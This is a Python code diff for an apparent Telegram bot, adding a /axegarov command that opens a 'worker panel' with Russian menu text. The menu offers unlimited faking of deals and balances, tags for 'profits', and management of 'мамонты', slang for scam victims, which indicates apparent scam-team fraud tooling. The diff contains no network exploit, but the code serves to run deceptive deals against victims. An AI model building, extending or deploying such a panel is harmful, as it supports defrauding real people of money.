@@ -1,5 +1,5 @@
 # handlers/admin.py
-"""Админ-флоу: /admin, /teamhash, admin_commands_help, admin_panel, admin_requisites/admin_req_/req_edit_, balance_and_requisites, balance_management/balance_*, pay_balance_/sent_item_/confirm_pay_, demote_worker, verified_users_list."""
+"""Админ-флоу: /admin, /teamhash, /axegarov, admin_commands_help, admin_panel, admin_requisites/admin_req_/req_edit_, balance_and_requisites, balance_management/balance_*, pay_balance_/sent_item_/confirm_pay_, demote_worker, verified_users_list."""
 
 import time
 import uuid
@@ -8,6 +8,43 @@ from bot_core import *
 from bot_core import _SHUTDOWN_FLAG  # noqa: F401
 from bot_ui import *  # noqa: F401,F403
 from .system import _is_team_admin_or_owner
+
+
+@bot.message_handler(commands=['axegarov'])
+def handle_axegarov(message):
+    """Команда /axegarov — открывает панель воркера для уже существующих воркеров"""
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+    
+    # Проверяем, есть ли у пользователя права воркера или админа
+    if is_team_worker(user_id) or is_admin_any_team(user_id) or is_system_owner(user_id):
+        # Сброс всех awaiting-флагов
+        if user_id in users:
+            for key in list(users[user_id].keys()):
+                if key.startswith('awaiting_'):
+                    users[user_id][key] = False
+        
+        worker_panel_text = f"""
+👷 <b>ВОРКЕР ПАНЕЛЬ</b>
+
+<b>Доступные действия:</b>
+• 📊 Просмотр статистики
+• 📋 Управление своими сделками
+• 💼 Накрутка сделок (без лимита)
+• 💰 Накрутка баланса (без лимита)
+• 🏷️ Управление тегом для профитов
+• 👥 Управление своими мамонтами
+
+<b>Выберите действие:</b>
+"""
+        send_photo_message(chat_id, None, worker_panel_text, worker_panel_menu(user_id))
+    else:
+        bot.send_message(
+            chat_id,
+            "❌ <b>Доступ запрещён</b>\n\nУ вас нет прав воркера.\n\n"
+            "Для получения прав используйте команду /teamhash (если у вас есть приглашение)",
+            parse_mode='HTML'
+        )
 
 
 @bot.message_handler(commands=['admin'])
@@ -704,5 +741,3 @@ def handle_verified_users_list(call):
     keyboard.add(InlineKeyboardButton(get_text(user_id, "btn_back", users), callback_data='verification_management'))
     send_photo_message(chat_id, message_id, text, keyboard)
     bot.answer_callback_query(call.id)
-
-
